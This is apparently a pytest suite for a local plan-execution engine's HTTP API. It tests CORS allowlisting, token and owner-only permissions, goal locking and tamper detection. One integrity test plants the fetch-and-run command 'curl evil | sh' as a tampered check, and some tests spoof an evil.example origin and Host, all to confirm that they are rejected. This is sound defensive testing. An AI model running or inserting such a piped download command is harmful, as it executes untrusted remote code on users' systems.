import http.client
import json
import sys
import threading

import pytest

from cc_engine import api, plan

ALLOWED = "http://127.0.0.1:3080"


class FakeRunner:
    def __init__(self):
        self.calls = []

    def __call__(self, argv):
        self.calls.append(list(argv))
        return 0, "", ""


class PowerRunner:
    """Fake ``shutdown`` runner: records argv, returns exit 0 (no real shutdown ever)."""

    def __init__(self):
        self.calls = []

    def __call__(self, argv):
        self.calls.append(list(argv))
        return 0


@pytest.fixture
def server(store, tmp_path):
    runner = FakeRunner()
    unknown = [{"pool": "codex_5h", "remaining_percent": None, "observed_at": None, "resets_at": None,
                "status": "UNKNOWN", "source": "unreachable: test"}]
    srv = api.make_server(store, host="127.0.0.1", port=0, usage_reader=lambda: unknown,
                          capture_runner=runner, capture_dir=tmp_path, heartbeat=0.5, poll_interval=0.2,
                          power_runner=PowerRunner())
    srv.fake_runner = runner
    t = threading.Thread(target=srv.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True)
    t.start()
    yield srv
    srv.shutdown()
    srv.server_close()


def call(srv, method, path, body=None, origin=None, raw=False, token=None, headers=None):
    conn = http.client.HTTPConnection("127.0.0.1", srv.server_address[1], timeout=10)
    headers = dict(headers or {})
    if token:
        headers["X-CC-Token"] = token
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        headers["Content-Type"] = "application/json"
    if origin:
        headers["Origin"] = origin
    conn.request(method, path, body=data, headers=headers)
    resp = conn.getresponse()
    payload = resp.read()
    conn.close()
    if raw:
        return resp, payload
    return resp, (json.loads(payload) if payload else None)


@pytest.fixture
def loaded(store, fixture_plan, tmp_path):
    fixture_plan["cwd"] = str(tmp_path)
    plan.import_plan(store, fixture_plan)
    return "fx"


def test_api_health(server):
    resp, body = call(server, "GET", "/health")
    assert resp.status == 200 and body["ok"] is True


def test_api_board_compact_with_waves_and_reduced_edges(server, loaded):
    resp, body = call(server, "GET", "/api/board?project=fx")
    assert resp.status == 200
    assert body["project"]["id"] == "fx" and body["revision"] == 1
    nodes = api.decode_nodes(body)
    by = {n["id"]: n for n in nodes}
    assert by["A"]["display_status"] == "ready" and by["B"]["display_status"] == "not_started"
    assert by["D"]["wave"] == 2
    assert set(by["A"]) <= set(api.BOARD_FIELDS) | set(api.LOOP_FIELDS) and set(api.BOARD_FIELDS) - {"checks", "recommended", "claim"} <= set(by["A"])
    assert ["A", "D"] not in body["edges"] and ["B", "D"] in body["edges"]
    assert body["counts"]["not_started"] == 4 and body["counts"]["ready"] == 1 and body["counts"]["total"] == 5


def test_api_board_under_50kb_for_300_nodes(server, store):
    nodes = []
    for i in range(300):
        deps = ["N%03d" % (i - 1), "N%03d" % (i - 2)] if i > 1 else []
        nodes.append({"id": "N%03d" % i, "title": "Build part %d of the control centre engine" % i,
                      "goal": "Goal text for node %d that is reasonably long and descriptive." % i,
                      "check": {"type": "command", "run": "python -m pytest engine/tests -k n%d -q" % i},
                      "deps": deps, "owner": "engine-core", "lane": "engine",
                      "pool": "claude_code", "model": "sonnet", "effort": "medium"})
    plan.import_plan(store, {"id": "big", "title": "Big", "brief": "Big plan", "nodes": nodes})
    store.set_node_status("big", "N000", "running", actor="scheduler:test")
    resp, raw = call(server, "GET", "/api/board?project=big", raw=True)
    assert resp.status == 200
    assert len(raw) < 50 * 1024, len(raw)
    body = json.loads(raw)
    assert len(api.decode_nodes(body)) == 300


def test_api_node_detail_with_events(server, loaded):
    resp, body = call(server, "GET", "/api/node?project=fx&id=D")
    assert resp.status == 200
    assert body["node"]["goal"] == "Join both sides." and body["node"]["check"]["type"] == "command"
    assert isinstance(body["events"], list)
    resp, _ = call(server, "GET", "/api/node?project=fx&id=ZZ")
    assert resp.status == 404


def test_api_stale_revision_is_409(server, loaded):
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "evidence": "x", "revision": 0}, origin=ALLOWED)
    assert resp.status == 409 and body == {"error": "stale", "revision": 1}


def test_api_owner_status_records_owner_actor(server, store, loaded):
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "evidence": "Looked fine", "revision": 1}, origin=ALLOWED)
    assert resp.status == 200 and body["revision"] == 2
    node = store.get_node("fx", "A")
    assert node["status"] == "done" and node["actor"] == "owner"
    resp, body = call(server, "POST", "/api/node/status", {"project": "fx", "id": "A", "status": "done"}, origin=ALLOWED)
    assert resp.status == 400


def test_api_cors_disallowed_origin_post_is_403(server, loaded):
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "revision": 1}, origin="http://evil.example")
    assert resp.status == 403
    assert resp.getheader("Access-Control-Allow-Origin") is None


def test_api_cors_allowlist_echo_and_preflight(server):
    resp, _ = call(server, "GET", "/health", origin="http://localhost:3080")
    assert resp.getheader("Access-Control-Allow-Origin") == "http://localhost:3080"
    resp, _ = call(server, "GET", "/health", origin="http://evil.example")
    assert resp.getheader("Access-Control-Allow-Origin") is None
    resp, _ = call(server, "OPTIONS", "/api/run", origin=ALLOWED)
    assert resp.status == 204 and "POST" in resp.getheader("Access-Control-Allow-Methods")
    resp, _ = call(server, "OPTIONS", "/api/run", origin="http://evil.example")
    assert resp.status == 403


def test_api_usage_is_unknown_and_never_bumps_revision(server, store, loaded):
    before = store.revision()
    resp, body = call(server, "GET", "/api/usage")
    assert resp.status == 200
    assert body["pools"][0]["status"] == "UNKNOWN" and body["pools"][0]["remaining_percent"] is None
    assert store.revision() == before


def test_api_sse_emits_state_after_mutation(server, store, loaded):
    conn = http.client.HTTPConnection("127.0.0.1", server.server_address[1], timeout=10)
    conn.request("GET", "/api/stream?project=fx")
    resp = conn.getresponse()
    assert resp.status == 200 and resp.getheader("Content-Type").startswith("text/event-stream")

    def next_event():
        kind, data = None, []
        while True:
            line = resp.fp.readline().decode()
            if not line:
                raise AssertionError("stream closed")
            line = line.rstrip("\r\n")
            if line == "" and kind:
                return kind, json.loads("".join(data))
            if line.startswith("event:"):
                kind = line[6:].strip()
            elif line.startswith("data:"):
                data.append(line[5:].strip())

    kind, first = next_event()
    assert kind == "state" and first["revision"] == 1
    store.set_node_status("fx", "A", "running", actor="scheduler:test")
    while True:
        kind, ev = next_event()
        if kind == "state":
            break
    assert ev["revision"] == 2 and ev["project"]["id"] == "fx"
    assert {n["id"]: n for n in api.decode_nodes(ev)}["A"]["status"] == "running"
    conn.close()


def test_api_brain_and_learn_503_when_missing(server, monkeypatch):
    monkeypatch.setitem(sys.modules, "cc_engine.brain_index", None)
    monkeypatch.setitem(sys.modules, "cc_engine.learn", None)
    resp, body = call(server, "GET", "/api/brain")
    assert resp.status == 503 and body["error"] == "unavailable"
    resp, body = call(server, "GET", "/api/learn")
    assert resp.status == 503
    resp, body = call(server, "POST", "/api/learn/record", {"concept": "x", "outcome": "pass"}, origin=ALLOWED)
    assert resp.status == 503


def test_api_prompt_packet(server, store, loaded):
    store.set_node_status("fx", "B", "done", actor="owner", evidence="left.txt written")
    resp, body = call(server, "POST", "/api/prompt", {"project": "fx", "id": "D"}, origin=ALLOWED)
    assert resp.status == 200
    p = body["prompt"]
    assert "Join both sides." in p
    assert "A small fixture plan used by the engine tests." in p
    assert "exit 0" in p
    assert "left.txt written" in p
    for rule in ("do not change the goal", "make the check pass", "report evidence"):
        assert rule in p.lower()


def test_api_run_sprint_and_cancel_do_not_bump_revision(server, store, loaded):
    before = store.revision()
    resp, body = call(server, "POST", "/api/run", {"project": "fx", "settings": {"preset": "frugal", "pools": ["claude_code"]}}, origin=ALLOWED)
    assert resp.status == 200
    run_id = body["id"]
    assert body["settings"]["expanded"]["max_concurrency"] >= 1
    resp, body = call(server, "POST", "/api/sprint", {"run_id": run_id, "pool": "claude_code", "start_at": "2026-11-04T12:17:35+00:00"}, origin=ALLOWED)
    assert resp.status == 200
    sid = body["id"]
    resp, _ = call(server, "POST", "/api/sprint/update", {"id": sid, "start_at": "2026-11-04T13:00:00+00:00"}, origin=ALLOWED)
    assert resp.status == 200
    resp, body = call(server, "GET", "/api/runs")
    run = [r for r in body["runs"] if r["id"] == run_id][0]
    assert run["sprints"][0]["start_at"] == "2026-11-04T13:00:00+00:00"
    resp, _ = call(server, "POST", "/api/run/cancel", {"id": run_id}, origin=ALLOWED)
    assert resp.status == 200
    resp, body = call(server, "GET", "/api/runs")
    assert [r for r in body["runs"] if r["id"] == run_id][0]["status"] == "cancelled"
    resp, body = call(server, "POST", "/api/run", {"project": "fx", "settings": {"preset": "yolo"}}, origin=ALLOWED)
    assert resp.status == 400
    assert store.revision() == before


def test_api_question_answer_routes_to_capture(server, store):
    from cc_engine import needs

    qid = needs.ask(store, "fx", None, "text", "Anything else?", purpose="preference")
    resp, body = call(server, "GET", "/api/questions?open=1")
    assert [q["id"] for q in body["questions"]] == [qid]
    assert body["questions"][0]["purpose"] == "preference"
    resp, body = call(server, "POST", "/api/question/answer", {"id": qid, "answer": "Keep it calm."}, origin=ALLOWED)
    assert resp.status == 200
    assert len(server.fake_runner.calls) == 1


def test_api_plan_import_route_requires_revision(server, store, repo_root):
    path = str(repo_root / "plans" / "build_plan.json")
    resp, body = call(server, "POST", "/api/plan/import", {"path": path}, origin=ALLOWED)
    assert resp.status == 400
    resp, body = call(server, "POST", "/api/plan/import", {"path": path, "revision": 0}, origin=ALLOWED)
    assert resp.status == 200 and body["project"] == "dsh-control-centre-build"
    resp, body = call(server, "GET", "/api/projects")
    assert [p["id"] for p in body["projects"]] == ["dsh-control-centre-build"]
    resp, body = call(server, "GET", "/api/events?project=dsh-control-centre-build&since=0")
    assert body["events"] and body["events"][0]["summary"]


def test_api_plan_import_accepts_inline_plan_dict(server, store, fixture_plan):
    resp, body = call(server, "POST", "/api/plan/import", {"plan": fixture_plan}, origin=ALLOWED)
    assert resp.status == 400  # revision still required
    resp, body = call(server, "POST", "/api/plan/import", {"plan": fixture_plan, "revision": 0}, origin=ALLOWED)
    assert resp.status == 200 and body["project"] == "fx" and body["revision"] == 1
    assert body["status"] == "active" and body["runnable"] is True  # Owner's own import runs
    assert len(store.list_nodes("fx")) == 5
    bad = dict(fixture_plan, id="bad", nodes=[{"id": "X", "goal": "g", "check": {"type": "nope"}, "deps": []}])
    resp, body = call(server, "POST", "/api/plan/import", {"plan": bad, "revision": 1}, origin=ALLOWED)
    assert resp.status == 400 and body["error"] == "bad_plan"
    assert store.get_project("bad") is None


def test_api_unknown_route_404(server):
    resp, body = call(server, "GET", "/api/nope")
    assert resp.status == 404


# ------------------------------------------------------------------ security: credentials and actors
def tok(srv):
    return srv.app.token


def test_security_token_file_created_private_and_reused(tmp_path):
    path = tmp_path / "sub" / "engine.token"
    t1 = api.ensure_token(path)
    assert len(t1) >= 32 and path.read_text(encoding="utf-8") == t1
    assert api.ensure_token(path) == t1  # reused, not rotated
    assert api.read_token(path) == t1
    if sys.platform == "win32":
        import subprocess
        acl = subprocess.run(["icacls", str(path)], capture_output=True, text=True).stdout
        assert "(I)" not in acl  # inheritance removed: only the explicit grant remains
        assert "Everyone" not in acl and "BUILTIN\\Users" not in acl and "Authenticated Users" not in acl


def test_security_server_writes_token_beside_db(server, store):
    assert api.read_token(store.path.parent / "engine.token") == server.app.token


def test_security_missing_origin_and_no_token_is_403(server, store, loaded):
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "revision": 1})
    assert resp.status == 403 and body["error"] == "forbidden"
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "revision": 1}, token="wrong-token")
    assert resp.status == 403
    resp, _ = call(server, "POST", "/api/run", {"project": "fx", "settings": {"preset": "frugal", "pools": ["claude_code"]}})
    assert resp.status == 403
    assert store.get_node("fx", "A")["status"] == "not_started" and store.list_runs() == []
    resp, _ = call(server, "GET", "/api/board?project=fx")  # GETs stay open on loopback
    assert resp.status == 200


def test_security_bad_host_header_is_403(server, loaded):
    resp, body = call(server, "POST", "/api/node/status", {"project": "fx", "id": "A", "status": "running",
                      "revision": 1}, origin=ALLOWED, headers={"Host": "evil.example:8751"})
    assert resp.status == 403 and body["error"] == "bad_host"


def test_security_token_actor_router_cannot_mark_done(server, store, loaded):
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "done", "revision": 1}, token=tok(server))
    assert resp.status == 403 and body["error"] == "owner_only"
    assert store.get_node("fx", "A")["status"] == "not_started"
    resp, body = call(server, "POST", "/api/node/status",
                      {"project": "fx", "id": "A", "status": "error", "revision": 1}, token=tok(server))
    assert resp.status == 200 and store.get_node("fx", "A")["actor"] == "router"


def test_security_router_cannot_start_runs(server, store, loaded):
    resp, body = call(server, "POST", "/api/run", {"project": "fx", "requested_by": "owner",
                      "settings": {"preset": "frugal", "pools": ["claude_code"]}}, token=tok(server))
    assert resp.status == 403 and body["error"] == "owner_only" and store.list_runs() == []
    resp, body = call(server, "POST", "/api/run", {"project": "fx", "requested_by": "router",
                      "settings": {"preset": "frugal", "pools": ["claude_code"]}}, origin=ALLOWED)
    assert resp.status == 200 and body["requested_by"] == "owner"
    resp, _ = call(server, "POST", "/api/sprint", {"run_id": body["id"], "pool": "claude_code",
                   "start_at": "2026-11-04T15:00:00+00:00"}, token=tok(server))
    assert resp.status == 403


def test_security_router_cannot_enable_power_off_answer_or_accept(server, store, loaded):
    from cc_engine import needs
    resp, body = call(server, "POST", "/api/run", {"project": "fx", "settings": {
        "preset": "frugal", "pools": ["claude_code"], "power_off": True}}, token=tok(server))
    assert resp.status == 403 and store.list_runs() == []
    qid = needs.ask(store, "fx", None, "text", "Anything else?")
    resp, _ = call(server, "POST", "/api/question/answer", {"id": qid, "answer": "x"}, token=tok(server))
    assert resp.status == 403 and needs.get_question(store, qid)["answered_at"] is None
    resp, _ = call(server, "POST", "/api/plan/accept", {"project": "fx"}, token=tok(server))
    assert resp.status == 403
    resp, _ = call(server, "POST", "/api/power/cancel", {}, token=tok(server))
    assert resp.status == 403 and server.app.power_runner.calls == []


def test_security_router_import_changing_goal_or_brief_is_rejected(server, store, fixture_plan):
    resp, _ = call(server, "POST", "/api/plan/import", {"plan": fixture_plan, "revision": 0}, origin=ALLOWED)
    assert resp.status == 200
    changed = json.loads(json.dumps(fixture_plan))
    changed["brief"] = "A sneaky new brief."
    resp, body = call(server, "POST", "/api/plan/import", {"plan": changed, "revision": 1}, token=tok(server))
    assert resp.status == 403 and body["error"] == "goal_locked"
    changed = json.loads(json.dumps(fixture_plan))
    changed["nodes"][0]["goal"] = "Another goal."
    resp, body = call(server, "POST", "/api/plan/import", {"plan": changed, "revision": 1}, token=tok(server))
    assert resp.status == 403
    assert store.get_project("fx")["brief"] == fixture_plan["brief"]


def test_security_question_create_passes_purpose(server, store):
    resp, body = call(server, "POST", "/api/question", {"prompt": "Calm or bold?", "kind": "text",
                      "purpose": "preference"}, token=tok(server))
    assert resp.status == 200 and body["question"]["purpose"] == "preference"
    resp, body = call(server, "GET", "/api/questions?open=1")
    assert body["questions"][0]["purpose"] == "preference"


# ------------------------------------------------------------------ integrity: drafts, locks, power cancel
def test_integrity_router_plan_is_draft_until_owner_accepts(server, store, fixture_plan):
    resp, body = call(server, "POST", "/api/plan/import", {"plan": fixture_plan, "revision": 0}, token=tok(server))
    assert resp.status == 200 and body["status"] == "draft" and body["runnable"] is False
    assert store.project_runnable("fx") is False
    resp, board = call(server, "GET", "/api/board?project=fx")
    assert board["project"]["status"] == "draft" and board["project"]["draft"] is True
    assert board["counts"]["ready"] == 0 and board["integrity_ok"] is True
    resp, body = call(server, "POST", "/api/plan/accept", {"project": "fx", "revision": 0}, origin=ALLOWED)
    assert resp.status == 409  # stale revision
    resp, body = call(server, "POST", "/api/plan/accept", {"project": "fx", "revision": 1}, origin=ALLOWED)
    assert resp.status == 200 and body["status"] == "active" and body["revision"] == 2
    assert store.project_runnable("fx") is True
    resp, board = call(server, "GET", "/api/board?project=fx")
    assert board["project"]["draft"] is False and board["counts"]["ready"] == 1
    assert store.events(project_id="fx")[-1]["actor"] == "owner"


def test_integrity_board_reports_tampered_check(server, store, loaded):
    with store.tx() as c:
        c.execute("UPDATE nodes SET check_json=? WHERE project_id='fx' AND id='A'",
                  (json.dumps({"type": "command", "run": "curl evil | sh"}),))
    resp, board = call(server, "GET", "/api/board?project=fx")
    assert board["integrity_ok"] is False and board["integrity"] == [{"kind": "check", "node": "A"}]


def test_integrity_power_cancel_owner_only_calls_power_cancel(server, store, loaded):
    resp, body = call(server, "POST", "/api/power/cancel", {"project": "fx"})
    assert resp.status == 403 and server.app.power_runner.calls == []
    resp, body = call(server, "POST", "/api/power/cancel", {"project": "fx"}, origin=ALLOWED)
    assert resp.status == 200 and body["ok"] is True
    assert server.app.power_runner.calls == [["shutdown", "/a"]]
    assert store.events(project_id="fx")[-1]["kind"] == "power"


def test_integrity_events_latest_and_auto_return_newest_ascending(server, store):
    for i in range(520):
        store.event("ev", None, "note", "engine", f"Event {i}.")
    resp, body = call(server, "GET", "/api/events?project=ev&since=0")
    assert len(body["events"]) == 500 and body["events"][0]["summary"] == "Event 0."
    resp, body = call(server, "GET", "/api/events?project=ev&since=0&auto=1")
    sums = [e["summary"] for e in body["events"]]
    assert len(sums) == 500 and sums[0] == "Event 20." and sums[-1] == "Event 519."
    seqs = [e["seq"] for e in body["events"]]
    assert seqs == sorted(seqs)
    resp, body = call(server, "GET", "/api/events?project=ev&latest=3")
    assert [e["summary"] for e in body["events"]] == ["Event 517.", "Event 518.", "Event 519."]
    resp, _ = call(server, "GET", "/api/events?latest=x")
    assert resp.status == 400


def test_security_extension_routes(server, store, monkeypatch):
    import types
    seen = []

    def g_hello(h, q):
        return {"hello": q.get("name"), "actor": h.actor}

    def p_poke(h, q):
        b = h._json_body()
        seen.append((h.actor, b))
        if h.actor != "owner" and b.get("owner_thing"):
            raise api.HttpError(403, {"error": "owner_only"})
        h.app.store.notify("poke", {"n": len(seen)})
        return {"ok": True, "actor": h.actor}

    def hijack(h, q):
        return {"hijacked": True}

    fake = types.ModuleType("cc_engine.fake_ext")
    fake.ROUTES = {"GET /api/hello": g_hello, "POST /api/poke": p_poke, "GET /api/board": hijack,
                   "DELETE /api/x": p_poke, "bogus": p_poke}
    no_routes = types.ModuleType("cc_engine.fake_empty")
    monkeypatch.setitem(sys.modules, "cc_engine.fake_ext", fake)
    monkeypatch.setitem(sys.modules, "cc_engine.fake_empty", no_routes)
    monkeypatch.setattr(api, "EXTENSIONS", ["fake_missing_module", "fake_empty", "fake_ext"])
    server.app._ext_routes = None
    routes = server.app.extension_routes()
    assert set(routes) == {"GET /api/hello", "POST /api/poke"}  # built-ins win; junk keys skipped

    resp, body = call(server, "GET", "/api/hello?name=rob")
    assert resp.status == 200 and body == {"hello": "rob", "actor": None}
    resp, body = call(server, "GET", "/api/board")
    assert "hijacked" not in body
    # same credential rule as built-in POSTs
    resp, body = call(server, "POST", "/api/poke", {"x": 1})
    assert resp.status == 403 and seen == []
    resp, body = call(server, "POST", "/api/poke", {"x": 1}, origin="http://evil.example")
    assert resp.status == 403 and seen == []
    resp, body = call(server, "POST", "/api/poke", {"x": 1}, origin=ALLOWED)
    assert resp.status == 200 and body["actor"] == "owner"
    resp, body = call(server, "POST", "/api/poke", {"owner_thing": 1}, token=tok(server))
    assert resp.status == 403 and seen[-1][0] == "router"
    resp, body = call(server, "POST", "/api/hello", {}, origin=ALLOWED)  # GET-only route
    assert resp.status == 404


# ---------------------------------------------------------------- C10 check counts
def _fail(cmd, cwd, timeout):
    return 1, "", "boom"


def _pass(cmd, cwd, timeout):
    return 0, "fine", ""


def _checks(server):
    _, body = call(server, "GET", "/api/board?project=fx")
    return {n["id"]: n["checks"] for n in api.decode_nodes(body)}


def test_board_check_counts_follow_check_results(server, store, loaded):
    from cc_engine import checks
    assert "checks" in api.BOARD_FIELDS
    assert set(_checks(server).values()) == {None}  # nothing has run yet
    checks.complete_node(store, "fx", "A", runner=_fail)
    assert _checks(server)["A"] == [0, 1, "fail"]
    checks.complete_node(store, "fx", "A", runner=_fail)
    checks.complete_node(store, "fx", "A", runner=_pass)
    got = _checks(server)
    assert got["A"] == [1, 2, "pass"] and got["B"] is None
    _, body = call(server, "GET", "/api/node?project=fx&id=A")
    assert body["node"]["checks"] == [1, 2, "pass"]


def test_board_check_counts_ignore_owner_marks_probes_and_old_checks(server, store, loaded, fixture_plan, tmp_path):
    from cc_engine import checks
    store.set_node_status("fx", "A", "done", "owner", summary="Owner marked A done.")
    assert _checks(server)["A"] is None  # Owner's mark is not a check result
    checks.complete_node(store, "fx", "B", runner=_pass, record_failure=False)  # probe: left.txt missing
    assert _checks(server)["B"] is None
    checks.complete_node(store, "fx", "D", runner=_fail)  # waiting on B, C: not run
    assert _checks(server)["D"] is None
    store.set_node_status("fx", "C", "error", "check:text_present")  # an older event without a hash
    assert _checks(server)["C"] == [0, 1, "fail"]
    checks.complete_node(store, "fx", "C", runner=_fail)
    assert _checks(server)["C"] == [0, 2, "fail"]
    # Owner gives C a different done-check: results against the old check no longer count,
    # except legacy events that carry no hash.
    fixture_plan["cwd"] = str(tmp_path)
    fixture_plan["nodes"][2]["check"] = {"type": "text_present", "path": "right.txt", "text": "done"}
    plan.import_plan(store, fixture_plan, actor="owner")
    assert _checks(server)["C"] == [0, 1, "fail"]


def test_board_with_check_counts_stays_under_50kb(server, store):
    from cc_engine import checks
    nodes = [{"id": "N%03d" % i, "title": "Build part %d of the control centre engine" % i,
              "goal": "Goal %d." % i, "check": {"type": "command", "run": "exit 0"},
              "deps": ["N%03d" % (i - 1)] if i else [], "lane": "engine", "pool": "claude_code",
              "model": "sonnet", "effort": "medium"} for i in range(300)]
    plan.import_plan(store, {"id": "big", "title": "Big", "brief": "Big plan", "nodes": nodes})
    for i in range(60):  # a long chain of results on the first nodes
        checks.complete_node(store, "big", "N%03d" % i, runner=_fail)
        checks.complete_node(store, "big", "N%03d" % i, runner=_pass)
    resp, raw = call(server, "GET", "/api/board?project=big", raw=True)
    assert resp.status == 200 and len(raw) < 50 * 1024, len(raw)
    rows = api.decode_nodes(json.loads(raw))
    assert rows[0]["checks"] == [1, 1, "pass"] and rows[299]["checks"] is None
